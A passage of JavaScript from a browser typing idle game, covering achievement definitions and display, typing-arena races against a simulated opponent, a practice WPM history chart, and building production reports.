        condition: () => cashEarnedBuildings >= 100000
    },
    {
        id: 13,
        name: "Achievement Hunter",
        description: "Unlock 10 achievements.",
        trivia: "Gotta catch 'em all!",
        emoji: '🎯',
        unlocked: false,
        progress: () => achievements.filter(a => a.unlocked).length,
        maxprogress: 10,
        showindex: 1002,
        condition: () => achievements.filter(a => a.unlocked).length >= 10
    },
    {
        id: 14,
        name: "Wordle Novice",
        description: "Solve 1 Wordle puzzle.",
        trivia: "One down, many more to go!",
        emoji: '🟩',
        unlocked: false,
        progress: () => wordlesSolved,
        maxprogress: 1,
        showindex: 1003,
        condition: () => wordlesSolved >= 1
    },
    {
        id: 15,
        name: "Wordle Enthusiast",
        description: "Solve 10 Wordle puzzles.",
        trivia: "You're getting the hang of this!",
        emoji: '🎮',
        unlocked: false,
        progress: () => wordlesSolved,
        maxprogress: 10,
        showindex: 1004,
        condition: () => wordlesSolved >= 10
    },
    {
        id: 16,
        name: "Wordle Master",
        description: "Solve 50 Wordle puzzles.",
        trivia: "You're a Wordle wizard!",
        emoji: '🧙',
        unlocked: false,
        progress: () => wordlesSolved,
        maxprogress: 50,
        showindex: 1005,
        condition: () => wordlesSolved >= 50
    },
    {
        id: 17,
        name: "Wordle Legend",
        description: "Solve 100 Wordle puzzles.",
        trivia: "Legendary Wordle solver!",
        emoji: '👑',
        unlocked: false,
        progress: () => wordlesSolved,
        maxprogress: 100,
        showindex: 1006,
        condition: () => wordlesSolved >= 100
    },
    {
        id: 18,
        name: "Arena Challenger",
        description: "Beat normal opponent in the Arena.",
        trivia: "You're a typing gladiator!",
        emoji: '⚔️',
        unlocked: false,
        progress: () => arenaBeatNormal + arenaBeatHard + arenaBeatVeryHard,
        maxprogress: 1,
        showindex: 1007,
        condition: () => arenaBeatNormal >= 1 || arenaBeatHard >= 1 || arenaBeatVeryHard >= 1
    },
    {
        id: 19,
        name: "Arena Champion",
        description: "Beat hard opponent in the Arena.",
        trivia: "Champion of the typing arena!",
        emoji: '🏅',
        unlocked: false,
        progress: () => arenaBeatHard + arenaBeatVeryHard,
        maxprogress: 1,
        showindex: 1008,
        condition: () => arenaBeatHard >= 1 || arenaBeatVeryHard >= 1
    },
    {
        id: 20,
        name: "Arena Legend",
        description: "Beat very hard opponent in the Arena.",
        trivia: "Typing legend in the arena!",
        emoji: '🌟',
        unlocked: false,
        progress: () => arenaBeatVeryHard,
        maxprogress: 1,
        showindex: 1009,
        condition: () => arenaBeatVeryHard >= 1
    },
    {
        id: 21,
        name: "Stock Investor",
        description: "Own 1 stock.",
        trivia: "First step to becoming a stock market mogul!",
        emoji: '📈',
        unlocked: false,
        progress: () => stocks.filter(stock => stock.owned >= 1).length,
        maxprogress: 1,
        showindex: 1010,
        condition: () => stocks.some(stock => stock.owned >= 1)
    },
    {
        id: 22,
        name: "Stock Market Tycoon",
        description: "Make $100,000 profit with stocks.",
        trivia: "You're a stock market genius!",
        emoji: '💎',
        unlocked: false,
        progress: () => stockProfitDollars,
        maxprogress: 100000,
        showindex: 1011,
        condition: () => stockProfitDollars >= 100000
    },
    {
        id: 23,
        name: "Golden Scoop",
        description: "Click on a golden news article.",
        trivia: "You found the golden scoop!",
        emoji: '📰',
        unlocked: false,
        progress: () => goldNewsClicks,
        maxprogress: 1,
        showindex: 1012,
        condition: () => goldNewsClicks > 0
    }
];

function checkAchievements() {
    achievements.forEach(achievement => {
        if (!achievement.unlocked) {
            if (achievement.condition()) {
                achievement.unlocked = true;
                playAchievementSound();
                showAchievement(achievement);
                gtag('event', 'achievement_unlock', {
                    'event_category': 'Achievements',
                    'achievement_id': achievement.id,
                    'achievement_name': achievement.name
                });
            }
            updateAchievement(achievement);
            updateAchievementStats();
        }
    });
}

function showAchievement(achievement) {
    showNotification(
        `<h1>${achievement.name}</h1>
        <h2>Achievement Unlocked</h2>`,
        `<div style="font-size: 3rem; text-align: center; margin: 1rem 0;">${achievement.emoji || '🏆'}</div>
        <p>${achievement.description}</p>
        <p class="trivia">"${achievement.trivia}"</p>`);
}

function updateAchievement(achievement) {
    const achievementElement = document.getElementById(`achievement-${achievement.id}`);
    if (achievementElement) {
        let progressNumber = achievement.progress().toFixed(0);
        progressNumber = Math.min(progressNumber, achievement.maxprogress);
        let progressPercent = (achievement.progress() / achievement.maxprogress) * 100;
        progressPercent = Math.min(progressPercent, 100);
        if(achievement.unlocked) {
            progressPercent = 100;
            progressNumber = achievement.maxprogress;
            achievementElement.classList.remove('locked');
            achievementElement.classList.add('unlocked');
        }
        const achievementProgress = document.getElementById(`achievement-${achievement.id}-progress-bar`);
        achievementProgress.style.width = `${progressPercent}%`;
        const achievementProgressText = document.getElementById(`achievement-${achievement.id}-progress`);
        achievementProgressText.textContent = `${progressNumber}/${achievement.maxprogress}`;
    }
}

function displayAchievements() {
    const achievementsContainer = document.getElementById('achievements-container');
    achievementsContainer.innerHTML = '';
      // Create stats section
    const statsSection = createAchievementStats();
    
    // Add stats to page before the container
    const parent = achievementsContainer.parentElement;
    
    // Remove any existing stats
    const existingStats = document.getElementById('achievements-stats');
    if (existingStats) existingStats.remove();
    
    // Add new elements
    parent.insertBefore(statsSection, achievementsContainer);
    
    // Sort achievements: unlocked first, then by progress percentage
    achievements.sort((a, b) => {
        if (a.unlocked && !b.unlocked) return -1;
        if (!a.unlocked && b.unlocked) return 1;
        
        // Secondary sort by progress percentage
        const aProgress = a.progress() / a.maxprogress;
        const bProgress = b.progress() / b.maxprogress;
        return bProgress - aProgress; // Higher progress first
    });
    
    // Display each achievement
    achievements.forEach(achievement => {        const achievementElement = document.createElement('div');
        achievementElement.className = 'achievement';
        achievementElement.id = `achievement-${achievement.id}`;
        achievementElement.classList.add(achievement.unlocked ? 'unlocked' : 'locked');        // Add blurred background image
        achievementElement.style.setProperty('--bg-image', `url('/images/tooltips/achievements/448/${achievement.id}.webp')`);
        
        // Calculate progress
        let progressPercent = (achievement.progress() / achievement.maxprogress) * 100;
        progressPercent = Math.min(progressPercent, 100);
        let progressNumber = Math.min(achievement.progress().toFixed(0), achievement.maxprogress);
        
        if(achievement.unlocked) {
            progressPercent = 100;
            progressNumber = achievement.maxprogress;
        }          achievementElement.innerHTML = `
            <div class="achievement-icon">
                ${achievement.emoji || '🏆'}
            </div>
            <div class="achievement-content">
                <h3 class="achievement-name">${achievement.name}</h3>
                <p class="achievement-description">${achievement.description}</p>
                <div class="achievement-progress">
                    <div class="progress-container">
                        <div class="progress-bar" id="achievement-${achievement.id}-progress-bar" style="width: ${progressPercent}%"></div>
                    </div>
                    <span class="progress-text" id="achievement-${achievement.id}-progress">${progressNumber}/${achievement.maxprogress}</span>
                </div>
            </div>
        `;
        
        achievementsContainer.appendChild(achievementElement);
    });
    
    // Update total progress display
    updateAchievementStats();
}

function createAchievementStats() {
    const statsSection = document.createElement('div');
    statsSection.id = 'achievements-stats';
    
    statsSection.innerHTML = `
        <div id="achievements-count">Achievements: 0/0</div>
        <div id="achievements-total-progress">
            <span>Overall Progress:</span>
            <div id="achievements-progress-bar">
                <div id="achievements-progress-fill"></div>
            </div>
            <span id="achievements-progress-percentage">0%</span>
        </div>
    `;
      return statsSection;
}

function updateAchievementStats() {
    const unlockedCount = achievements.filter(a => a.unlocked).length;
    const totalCount = achievements.length;
    const progressPercent = (unlockedCount / totalCount) * 100;
    
    const countElement = document.getElementById('achievements-count');
    const fillElement = document.getElementById('achievements-progress-fill');
    const percentageElement = document.getElementById('achievements-progress-percentage');
    
    if (countElement) countElement.textContent = `Achievements: ${unlockedCount}/${totalCount}`;
    if (fillElement) fillElement.style.width = `${progressPercent}%`;
    if (percentageElement) percentageElement.textContent = `${progressPercent.toFixed(1)}%`;
}

function updateAchievement(achievement) {
    const achievementElement = document.getElementById(`achievement-${achievement.id}`);
    if (achievementElement) {
        // If achievement was just unlocked
        if (achievement.unlocked && achievementElement.classList.contains('locked')) {
            achievementElement.classList.remove('locked');
            achievementElement.classList.add('unlocked', 'recently-unlocked');
            
            // Update status and badge
            const statusElement = achievementElement.querySelector('.achievement-status');
            if (statusElement) statusElement.textContent = 'Completed';
            
            const badgeElement = achievementElement.querySelector('.achievement-badge');
            if (badgeElement) badgeElement.textContent = '✓';
            
            // Remove lock overlay
            const lockOverlay = achievementElement.querySelector('.achievement-icon-overlay');
            if (lockOverlay) lockOverlay.remove();
            
            // After 5 seconds, remove the glow effect
            setTimeout(() => {
                achievementElement.classList.remove('recently-unlocked');
            }, 5000);
        }
          // Update progress bar and text
        let progressNumber = achievement.progress().toFixed(0);
        progressNumber = Math.min(progressNumber, achievement.maxprogress);
        let progressPercent = (achievement.progress() / achievement.maxprogress) * 100;
        progressPercent = Math.min(progressPercent, 100);
        if(achievement.unlocked) {
            progressPercent = 100;
            progressNumber = achievement.maxprogress;
        }
        const achievementProgress = document.getElementById(`achievement-${achievement.id}-progress-bar`);
        achievementProgress.style.width = `${progressPercent}%`;
        const achievementProgressText = document.getElementById(`achievement-${achievement.id}-progress`);
        achievementProgressText.textContent = `${progressNumber}/${achievement.maxprogress}`;
    }
}

let raceStartTime = 0; 
let playerKeystrokes = 0;
let opponentKeystrokes = 0;
let raceActive = false;
let raceTimerStarted = false;
let practiceActive = false;
let practiceTimerStarted = false;
let arenaCurrentWordIndex = 0;
let arenaWords = [];
let playerWPM = 0;
let practiceWPM = 0;
let opponentWPM = 0;
let selectedDifficulty = "Normal";
let opponentELO = 1000;
let medalsToGain = 1;
let arenaUIState = "";
let practiceUIState = "";

const raceTargetKeystrokes = 200; // 40 words
const difficultySettings = {
    Normal: { baseELO: 1000, goldMedals: 1 },
    Hard: { baseELO: 1200, goldMedals: 2 },
    VeryHard: { baseELO: 1600, goldMedals: 3 },
};

const arenaTabs = {
    arena: {
        tab: document.getElementById("arena-stats-tab"),
        page: document.getElementById("arena-racePage")
    },
    practice: {
        tab: document.getElementById("practice-stats-tab"),
        page: document.getElementById("arena-practicePage")
    }
};

let currentArenaPage = "arena";
function switchArenaTab(activeTab) {
    currentArenaPage = activeTab.id;
    for (const key in arenaTabs) {
        if (arenaTabs[key].tab === activeTab) {
            arenaTabs[key].page.style.display = "block";
            arenaTabs[key].tab.classList.add("active");
        } else {
            arenaTabs[key].page.style.display = "none";
            arenaTabs[key].tab.classList.remove("active");
        }
    }
    playMenuSound();
}

for (const key in arenaTabs) {
    arenaTabs[key].tab.addEventListener("click", () => switchArenaTab(arenaTabs[key].tab));
}   

const difficultySelect = document.getElementById("difficulty-select");
difficultySelect.addEventListener("change", () => {
    selectedDifficulty = difficultySelect.value;
});

function displayPracticeTab() {
    if(practiceActive) {
        if(practiceUIState != "practice") {
            practiceUIState = "practice";
            document.getElementById("practice-stats").style.display = "none";
            document.getElementById("practice-input-box").value = "";
            document.getElementById("practice-race").style.display = "block";
            document.getElementById("practice-result").innerHTML = "";
            document.getElementById("practice-input-box").focus();
        }
        if(!practiceTimerStarted) return;
        const practiceDurationSeconds = (performance.now() - raceStartTime) / 1000; 
        if(practiceDurationSeconds >= 60) {
            finishPracticeRace();
        } else {
            updatePracticeProgress();
        }
    } else {
        if(practiceUIState != "init") {
            practiceUIState = "init";
            document.getElementById("practice-progress-bar").style.width = "100%";
            document.getElementById("practice-stats").style.display = "block";
            document.getElementById("practice-race").style.display = "none";
            
            // Show practice history if available
            updatePracticeHistoryDisplay();
        }
    }
}

function displayArenaTab() {
    let finishBoost = modifiers.find(modifier => modifier.name === "Race Finish Buff");
    let championBoost = modifiers.find(modifier => modifier.name === "Champion of the Arena");
    if(!finishBoost) {
        if(raceActive) {
            if(arenaUIState != "race") {
                arenaUIState = "race";
                document.getElementById("arena-stats").style.display = "none";
                document.getElementById("arena-tab").classList.remove("ready");
                document.getElementById("arena-input-box").value = "";
                document.getElementById("start-race").style.display = "none";
                document.getElementById("arena-race").style.display = "block";
                document.getElementById("arena-result").innerHTML = "";
                document.getElementById("arena-input-box").focus();
            }
        } else {
            if(arenaUIState != "init") {
                arenaUIState = "init";
                document.getElementById("arena-tab").classList.add("ready");
                document.getElementById("gold-medals").textContent = arenaGoldMedals;
                document.getElementById("arena-race").style.display = "none";
                document.getElementById("start-race").style.display = "block";
                document.getElementById("arena-stats").style.display = "block";
                document.getElementById("arena-result").innerHTML = "";
                //document.getElementById("startRaceButton").disabled = false;
            }
        }
    } else {
        if(arenaUIState != "race_end") {
            arenaUIState = "race_end";
            //document.getElementById("startRaceButton").disabled = true;
            document.getElementById("arena-stats").style.display = "block";
            document.getElementById("gold-medals").textContent = arenaGoldMedals;
            document.getElementById("start-race").style.display = "none";
            document.getElementById("arena-race").style.display = "none";
            document.getElementById("player-progress-bar").style.width = "0";
            document.getElementById("opponent-progress-bar").style.width = "0";
        }
        if(championBoost) {
            document.getElementById("arena-result").innerHTML = `
            <p>You won!</p>
            <p>Auto Writers and manually typed words boosted by 100%. Manual keystrokes gain 1% of your passive income.</p>
            <p>(Your WPM: ${playerWPM}, Opponent WPM: ${opponentWPM})</p>
            <p>You can play again in: ${(finishBoost.duration / Tickrate).toFixed(0)}s</p>`;
        } else {
            document.getElementById("arena-result").innerHTML = `
            <p>You lost!</p>
            <p>(Your WPM: ${playerWPM}, Opponent WPM: ${opponentWPM})</p>
            <p>You can play again in: ${(finishBoost.duration / Tickrate).toFixed(0)}s</p>`;
        }
    }
}
function displayArena() {
    if(TypingArena.level > 0) {
        document.getElementById("arena-tab").disabled = false;
    }
    displayArenaTab();
    displayPracticeTab();
}
function updateRaceProgress() {
    const playerProgressBar = document.getElementById("player-progress-bar");
    const opponentProgressBar = document.getElementById("opponent-progress-bar");
    
    playerProgressBar.style.width = `${(playerKeystrokes / raceTargetKeystrokes) * 100}%`;
    opponentProgressBar.style.width = `${(opponentKeystrokes / raceTargetKeystrokes) * 100}%`;
}
function updatePracticeProgress() {
    const practiceProgressBar = document.getElementById("practice-progress-bar");
    if(practiceTimerStarted) {
        const practiceDurationSeconds = (performance.now() - raceStartTime) / 1000; 
        document.getElementById("practice-time-left").textContent = (60 - practiceDurationSeconds).toFixed(0);
        practiceProgressBar.style.width = `${100 - ((practiceDurationSeconds / 60) * 100)}%`;
    } else {
        practiceProgressBar.style.width = "100%";
        document.getElementById("practice-time-left").textContent = "60";
    }
}
function startArenaRace() {
    if (raceActive || practiceActive) return;
    
    raceActive = true;
    playerKeystrokes = 0;
    opponentKeystrokes = 0;
    
    
    // Generate words for typing race
    arenaWords = [];
    for (let i = 0; i < 60; i++) {
        arenaWords.push(getRandomWord());
    }
    arenaCurrentWordIndex = 0;
    updateArenaWordList(false);
    
    const selectedDifficultyConfig = difficultySettings[selectedDifficulty];
    opponentELO = selectedDifficultyConfig.baseELO;
    medalsToGain = selectedDifficultyConfig.goldMedals;
    
    
    // Update UI
    document.getElementById("player-progress").textContent = "0";
    document.getElementById("opponent-progress").textContent = "0";
}

function startPracticeRace() {
    if (raceActive || practiceActive) return;
    
    practiceActive = true;
    playerKeystrokes = 0;
    
    
    // Generate words for typing race
    arenaWords = [];
    for (let i = 0; i < 60; i++) {
        arenaWords.push(getRandomWord());
    }
    arenaCurrentWordIndex = 0;
    updateArenaWordList(true);
    updatePracticeProgress();
}


function updateArenaWordList(practice) {
    let wordsDisplay;
    let inputBox;
    if(practice) {
        wordsDisplay = document.getElementById('practice-words-to-type');
        inputBox = document.getElementById('practice-input-box');
    } else {
        wordsDisplay = document.getElementById('arena-words-to-type');
        inputBox = document.getElementById('arena-input-box');
    }
    if(arenaCurrentWordIndex > 0) {
        let firstElement = wordsDisplay.children[0];
        const currentElement = wordsDisplay.children[arenaCurrentWordIndex];
        let toRemove = [];
        while (currentElement.getBoundingClientRect().top - 10 > firstElement.getBoundingClientRect().top) {
            toRemove.push(wordsDisplay.children[toRemove.length]);
            firstElement = wordsDisplay.children[toRemove.length];
        }
        if(toRemove.length > 0) {
            for(let i = 0; i < toRemove.length; i++) {
                wordsDisplay.removeChild(toRemove[i]);
                arenaWords.shift();
                arenaWords.push(getRandomWord());
            }
            arenaCurrentWordIndex = 0;
        }
    }
    if(wordsDisplay.children.length < arenaWords.length) {
        for(let i = wordsDisplay.children.length; i < arenaWords.length; i++) {
            const wordElement = document.createElement('div');
            wordElement.className = 'word';
            wordElement.textContent = arenaWords[i];
            wordsDisplay.appendChild(wordElement);
        }
    }
    inputBox.placeholder = `Type '${arenaWords[arenaCurrentWordIndex]}' here...`;
    arenaColorTextByCharacter('', wordsDisplay, arenaWords[arenaCurrentWordIndex], arenaCurrentWordIndex);
}

// New function to handle Arena-specific character highlighting
function arenaColorTextByCharacter(inputText, wordsDisplay, word, currentIndex) {
    let coloredText = '';
    let mistakeFound = false;
    
    // Make current word stand out
    for (let i = 0; i < wordsDisplay.children.length; i++) {
        wordsDisplay.children[i].classList.remove('current');
    }
    if (wordsDisplay.children[currentIndex]) {
        wordsDisplay.children[currentIndex].classList.add('current');
    }
    
    // Process each character
    for (let i = 0; i < word.length; i++) {
        let characterClass = '';
        
        if (i < inputText.length) {
            // User has typed this character
            if (word[i] === inputText[i] && !mistakeFound) {
                characterClass = 'character correct';
            } else {
                characterClass = 'character mistake';
                mistakeFound = true;
            }
        } else {
            // Character not yet typed
            characterClass = i === inputText.length ? 'character current' : 'character';
        }
        
        coloredText += `<span class="${characterClass}">${word[i]}</span>`;
    }
    
    if (wordsDisplay.children[currentIndex]) {
        wordsDisplay.children[currentIndex].innerHTML = coloredText;
    }
}

document.getElementById("practice-input-box").addEventListener("input", function () {
    if(!practiceTimerStarted) { 
        raceStartTime = performance.now();
        practiceTimerStarted = true;
    }
    const inputBox = document.getElementById("practice-input-box");
    const inputText = inputBox.value.trim();
    arenaColorTextByCharacter(inputText, document.getElementById('practice-words-to-type'), arenaWords[arenaCurrentWordIndex], arenaCurrentWordIndex);
    if (inputBox.value.endsWith(" ")) {
        if (inputText === arenaWords[arenaCurrentWordIndex]) {
            playerKeystrokes += inputText.length;
            arenaCurrentWordIndex++;
            updateArenaWordList(true);
            inputBox.value = "";
        } else {
            if(skipOnMistake) {
                arenaCurrentWordIndex++;
                updateArenaWordList(true);
                inputBox.value = "";
            }
        }
        
        updatePracticeProgress();
    }
});

document.getElementById("arena-input-box").addEventListener("input", function () {
    if(!raceTimerStarted) {
        raceStartTime = performance.now();
        raceTimerStarted = true;
        simulateOpponentTyping();
    }
    const inputBox = document.getElementById("arena-input-box");
    const inputText = inputBox.value.trim();
    arenaColorTextByCharacter(inputText, document.getElementById('arena-words-to-type'), arenaWords[arenaCurrentWordIndex], arenaCurrentWordIndex);
    if (inputBox.value.endsWith(" ")) {
        if (inputText === arenaWords[arenaCurrentWordIndex]) {
            playerKeystrokes += inputText.length;
            arenaCurrentWordIndex++;
            updateArenaWordList(false);
            inputBox.value = "";
        } else {
            if(skipOnMistake) {
                arenaCurrentWordIndex++;
                updateArenaWordList(false);
                inputBox.value = "";
            }
        }
        
        document.getElementById("player-progress").textContent = playerKeystrokes.toFixed(0);
        updateRaceProgress();
        if (playerKeystrokes >= raceTargetKeystrokes) {
            finishArenaRace(true);
        }
    }
});

function simulateOpponentTyping() {
    // 1) Compute the base WPM from player ELO:
    //    - 1000 ELO => 30 WPM
    //    - +/- 100 ELO => +/- 10 WPM
    let baseWPM = 30 + 10 * ((opponentELO - 1000) / 100);
    
    // 2) Clamp the minimum speed (optional)
    if (baseWPM < 1) {
        baseWPM = 1;
    }
    
    // 3) Use setInterval to update keystrokes every second
    const typingInterval = setInterval(() => {
        if (!raceActive) {
            clearInterval(typingInterval);
            return;
        }
        
        // Each second, apply a new random adjustment
        const randomAdjustment = Math.random() * 10 - 5;  // range: -5 ... +5
        const finalWPM = baseWPM + randomAdjustment;
        
        // Convert WPM -> keystrokes per second (KPS).
        // 1 word = 5 keystrokes, so 1 WPM = 5 keystrokes/min = 5/60 keystrokes/sec
        const opponentKPS = (finalWPM * 5) / 60; 
        
        // Add keystrokes each second
        opponentKeystrokes += opponentKPS;
        
        if(currentGuildTask === "arena") {
            const PlayerWPMBoost = (10 * 5) / 60;
            playerKeystrokes += PlayerWPMBoost;
            document.getElementById("player-progress").textContent = playerKeystrokes.toFixed(0);
        }
        
        updateRaceProgress();
        document.getElementById("opponent-progress").textContent = Math.min(
            opponentKeystrokes.toFixed(0),
            raceTargetKeystrokes
        );
        
        if (opponentKeystrokes >= raceTargetKeystrokes) {
            clearInterval(typingInterval);
            finishArenaRace(false);
        }
    }, 1000); // update every second
}

function finishPracticeRace() {
    practiceTimerStarted = false;
    practiceActive = false;
    const practiceEndTime = performance.now();
    const practiceDurationSeconds = (practiceEndTime - raceStartTime) / 1000; 
    // Avoid division by zero if for some reason raceDurationSeconds is 0
    const safeDuration = practiceDurationSeconds > 0 ? practiceDurationSeconds : 0.1;
    practiceWPM = Math.round((playerKeystrokes / 5) / (safeDuration / 60));
    document.getElementById("practice-result").innerHTML = `Your WPM: ${practiceWPM}`;
    
    // Save practice result to history
    const practiceResult = {
        date: Date.now(),
        wpm: practiceWPM,
        keystrokes: playerKeystrokes
    };
    
    practiceHistory.push(practiceResult);
    
    // Limit history to the most recent 100 entries
    if (practiceHistory.length > 100) {
        practiceHistory.shift();
    }
    
    // Update history graph
    updatePracticeHistoryDisplay();
    
    gtag('event', 'arena_speedtest', {
        'event_category': 'arena',
        'wpm': practiceWPM
    });
}

function finishArenaRace(playerWon) {
    raceTimerStarted = false;
    raceActive = false;
    const raceEndTime = performance.now();
    const raceDurationSeconds = (raceEndTime - raceStartTime) / 1000; 
    
    // Avoid division by zero if for some reason raceDurationSeconds is 0
    const safeDuration = raceDurationSeconds > 0 ? raceDurationSeconds : 0.1;
    playerWPM = Math.round((playerKeystrokes / 5) / (safeDuration / 60));
    opponentWPM = Math.round((opponentKeystrokes / 5) / (safeDuration / 60));
    if (playerWon) {
        arenaGoldMedals += medalsToGain;
        if(medalsToGain == 3) {
            arenaBeatVeryHard++;
        } else if(medalsToGain == 2) {
            arenaBeatHard++;
        } else if(medalsToGain == 1) {
            arenaBeatNormal++;
        }
        applyArenaChampionBuff();
        playWinSound();
        triggerWinEffect();
    } else {
        playLoseSound();
    }
    applyRaceFinishBuff();
    gtag('event', 'arena_result', {
        'event_category': 'arena',
        'player_wpm': playerWPM
    });
}

function triggerWinEffect() {
    const arenaPage = document.getElementById("arenaPage");
    const winEffect = document.createElement("div");
    winEffect.className = "win-effect";
    winEffect.innerHTML = "🏆 You Won! 🏆";
    
    arenaPage.appendChild(winEffect);
    
    setTimeout(() => {
        winEffect.remove();
    }, 3000); // Remove the effect after 3 seconds
}

function applyRaceFinishBuff() {
    spawnBoost(1);
}

function applyArenaChampionBuff() {
    spawnBoost(2);
}

// Function to update the practice history display
function updatePracticeHistoryDisplay() {
    const historySection = document.getElementById('practice-history-section');
    
    if (practiceHistory.length === 0) {
        return;
    }
    
    historySection.style.display = 'block';
    
    // Calculate statistics
    const wpmValues = practiceHistory.map(entry => entry.wpm);
    const averageWPM = wpmValues.reduce((sum, wpm) => sum + wpm, 0) / wpmValues.length;
    const bestWPM = Math.max(...wpmValues);
    const recentTrend = calculateRecentTrend();
    
    // Update statistics display
    document.getElementById('practice-average-wpm').textContent = averageWPM.toFixed(1);
    document.getElementById('practice-best-wpm').textContent = bestWPM;
    document.getElementById('practice-count').textContent = practiceHistory.length;
    
    const trendElement = document.getElementById('practice-trend');
    if (recentTrend > 0) {
        trendElement.textContent = `+${recentTrend.toFixed(1)}`;
        trendElement.className = 'trend-up';
    } else if (recentTrend < 0) {
        trendElement.textContent = `${recentTrend.toFixed(1)}`;
        trendElement.className = 'trend-down';
    } else {
        trendElement.textContent = '0';
        trendElement.className = '';
    }
    
    // Update chart
    updatePracticeHistoryChart();
}

// Function to calculate the recent trend (comparing last 5 tests to previous 5)
function calculateRecentTrend() {
    if (practiceHistory.length < 10) return 0;
    
    const recentTests = practiceHistory.slice(-5);
    const previousTests = practiceHistory.slice(-10, -5);
    
    const recentAvg = recentTests.reduce((sum, entry) => sum + entry.wpm, 0) / recentTests.length;
    const previousAvg = previousTests.reduce((sum, entry) => sum + entry.wpm, 0) / previousTests.length;
    
    return recentAvg - previousAvg;
}

// Function to create and update the practice history chart
function updatePracticeHistoryChart() {
    const ctx = document.getElementById('practice-history-chart').getContext('2d');
    
    // Prepare data for the chart
    const displayData = practiceHistory.slice(-30); // Show up to 30 most recent tests
    
    const labels = displayData.map(entry => {
        const date = new Date(entry.date);
        return `${date.getMonth()+1}/${date.getDate()}`;
    });
    
    const data = displayData.map(entry => entry.wpm);
    
    // Destroy existing chart if it exists
    if (window.practiceHistoryChart) {
        window.practiceHistoryChart.destroy();
    }
    
    // Create new chart
    window.practiceHistoryChart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: labels,
            datasets: [{
                label: 'WPM',
                data: data,
                borderColor: getComputedStyle(document.body).getPropertyValue('--correct-color'),
                backgroundColor: getComputedStyle(document.body).getPropertyValue('--correct-color') + '33',
                tension: 0.3,
                fill: true
            }]
        },
        options: {
            scales: {
                y: {
                    beginAtZero: true,
                    ticks: {
                        color: getComputedStyle(document.body).getPropertyValue('--body-color')
                    },
                    grid: {
                        color: getComputedStyle(document.body).getPropertyValue('--border') + '33'
                    }
                },
                x: {
                    ticks: {
                        color: getComputedStyle(document.body).getPropertyValue('--body-color')
                    },
                    grid: {
                        color: getComputedStyle(document.body).getPropertyValue('--border') + '33'
                    }
                }
            },
            plugins: {
                legend: {
                    labels: {
                        color: getComputedStyle(document.body).getPropertyValue('--body-color')
                    }
                },
                tooltip: {
                    callbacks: {
                        label: function(context) {
                            const entry = displayData[context.dataIndex];
                            const date = new Date(entry.date);
                            return [`WPM: ${entry.wpm}`, 
                                    `Date: ${date.toLocaleDateString()}`, 
                                    `Time: ${date.toLocaleTimeString()}`];
                        }
                    }
                }
            },
            responsive: true,
            maintainAspectRatio: false
        }
    });
}

function updateReportsButton() {
    const reportsTab = document.getElementById('reports-tab');
    if (Printer.level > 0) {
        reportsTab.disabled = false;
    }
}

let reportsInitialized = false;

function initReports() {
    if (!reportsInitialized) {
        const reportsContainer = document.getElementById('production-reports');
        buildings.forEach(building => {
            const reportDiv = document.createElement('div');
            reportDiv.id = `report-${building.id}`;
            reportDiv.className = "report";
            reportDiv.style.backgroundImage = `url("/images/tooltips/buildings/${building.id}.jpg")`;
            reportsContainer.appendChild(reportDiv);
        });
        reportsInitialized = true;
    }
    displayReports();
}

function getReportSignature(building) {
    const activeModifiers = modifiers
    .filter(mod => mod.affectedBuildings && mod.affectedBuildings.includes(building.id))
    .map(mod => {
        const multiplier = typeof mod.getMultiplier === 'function'
        ? mod.getMultiplier()
        : mod.multiplier || 1;
        return {
            name: mod.name,
            multiplier
        };
    });
    
    // Return a JSON-serializable object that includes the level and the modifiers.
    return JSON.stringify({
        level: building.level,
        modifiers: activeModifiers
    });
}

function displayReports() {
    updateReportsButton();
    updateManualReport();
    buildings.forEach(building => {
        const reportDiv = document.getElementById(`report-${building.id}`);
        if (!reportDiv) return;
        
        if (building.level > 0) {
            reportDiv.style.display = 'block';
            
            // 1. Compute the new signature.
            const newSignature = getReportSignature(building);
            
            // 2. Compare with existing (stored) signature.
            const oldSignature = reportDiv.dataset.modifiersSignature;
            
            // 3. If they differ, update the ul content.
            if (newSignature !== oldSignature) {
                // Rebuild only the <ul> or the entire content if you prefer
                const baseProduction = building.baseProduce;
                const singleProduce = building.getProduceSingle();
                const totalProduction = building.getProduce();
                
                const activeModifiers = modifiers
                .filter(mod => mod.affectedBuildings && mod.affectedBuildings.includes(building.id))
                .map(mod => {
                    const multiplier = typeof mod.getMultiplier === 'function'
                    ? mod.getMultiplier()
                    : mod.multiplier || 1;
                    const percentage = ((multiplier - 1) * 100).toFixed(2);
                    return {
                        name: mod.name,
                        multiplier,
                        percentage
                    };
                });
                
                let modifiersDetails = activeModifiers.length
                ? activeModifiers.map(mod => `<li><span class="modifierName">${mod.name}:</span> <span class="modifierValue">+${mod.percentage}%</span></li>`).join("")
                : '<li>None</li>';
                
                // Compute total multiplier
                const totalMultiplier = activeModifiers.reduce(
                    (acc, mod) => acc * mod.multiplier,
                    1
                );
                
                
                
                  // Update the inner HTML (or just the UL portion).
                reportDiv.innerHTML = `
                    <div class="report-receipt">
                        <div class="report-header">
                            <img src="/images/buildings/128/${building.id}.png" class="currencyicon" alt="${building.name}">
                            <h3>${building.name}</h3>
                        </div>
                        <div class="report-description">${building.special}</div>
                        <div class="report-stats">
                            <div class="report-stat">
                                <div class="report-stat-label">Owned</div>
                                <div class="report-stat-value">${building.level}</div>
                            </div>
                            <div class="report-stat">
                                <div class="report-stat-label">Base Rate</div>
                                <div class="report-stat-value">${formatShortScale(baseProduction)}/s</div>
                            </div>
                            <div class="report-stat">
                                <div class="report-stat-label">Each Produces</div>
                                <div class="report-stat-value">${formatShortScale(singleProduce)}/s</div>
                            </div>
                            <div class="report-stat">
                                <div class="report-stat-label">Multiplier</div>
                                <div class="report-stat-value">${totalMultiplier.toFixed(2)}x</div>
                            </div>
                        </div>
                        <div class="report-modifiers">
                            <div class="report-modifiers-header">Active Modifiers</div>
                            <ul class="report-modifiers-list">${modifiersDetails}</ul>
                        </div>
                        <div class="report-summary">
                            <span class="report-summary-label">Total Production</span>
                            <span class="report-summary-value">${formatShortScale(totalProduction)}/s</span>
                        </div>
                        <div class="report-trivia">${building.trivia}</div>
                    </div>
                `;
                
                // Update the stored signature so we don’t rebuild again unnecessarily.
                reportDiv.dataset.modifiersSignature = newSignature;
                reportDiv.querySelector('.report-receipt').classList.add('updated');
                setTimeout(() => {
                    reportDiv.querySelector('.report-receipt').classList.remove('updated');
                }, 500); // Remove class after animation
            }
        } else {
            reportDiv.style.display = 'none';
        }
    });
}

function updateManualReport() {
    let manualIncomeReport = document.getElementById('report-manual');
    
    // Calculate value of one manual keystroke
